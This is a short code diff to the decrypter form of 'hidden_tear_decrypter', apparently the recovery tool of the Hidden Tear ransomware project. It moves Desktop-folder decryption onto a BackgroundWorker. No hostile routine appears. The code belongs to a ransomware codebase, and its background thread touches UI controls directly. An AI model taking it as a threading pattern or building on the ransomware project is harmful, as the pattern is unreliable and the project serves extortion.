@@ -32,6 +32,7 @@ namespace hidden_tear_decrypter
     {
         string userName = Environment.UserName;
         string userDir = "C:\\Users\\";
+        BackgroundWorker bw;
 
         public Form1()
         {
@@ -90,7 +91,7 @@ namespace hidden_tear_decrypter
 
         }
 
-        public void DecryptDirectory(string location)
+        public async void DecryptDirectory(string location)
         {
             string password = textBox1.Text;
 
@@ -108,15 +109,17 @@ namespace hidden_tear_decrypter
             {
                 DecryptDirectory(childDirectories[i]);
             }
+
             label3.Visible = true;
-            
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
             string path = "\\Desktop";
             string fullpath = userDir + userName + path;
-            DecryptDirectory(fullpath);
+            bw = new BackgroundWorker();
+            bw.DoWork += (obj, ea) => DecryptDirectory(fullpath);
+            bw.RunWorkerAsync();
         }
 
         private void Form1_Load(object sender, EventArgs e)
